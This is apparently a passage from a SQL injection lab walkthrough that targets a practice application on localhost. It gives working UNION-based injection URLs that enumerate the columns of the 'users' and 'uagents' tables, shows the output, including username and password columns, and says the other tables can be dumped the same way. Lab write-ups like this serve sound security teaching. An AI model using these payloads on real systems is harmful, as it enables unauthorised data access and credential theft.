Showing columns in each security table



a) Users table columns.

QUERY:

select column_name from information_schema.columns where table_name ='users';


URL: http://localhost/Less-1/?id=-1' UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name="users" --+



Result: “USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password”

b) Uagents table columns.

QUERY:

select column_name from information_schema.columns where table_name ='uagents';


URL: http://localhost/Less-1/?id=-1' UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name="uagents" --+



Result: “id,uagent,ip_address,username”.

Similarly you can dump the rest of the tables (emails,referers).
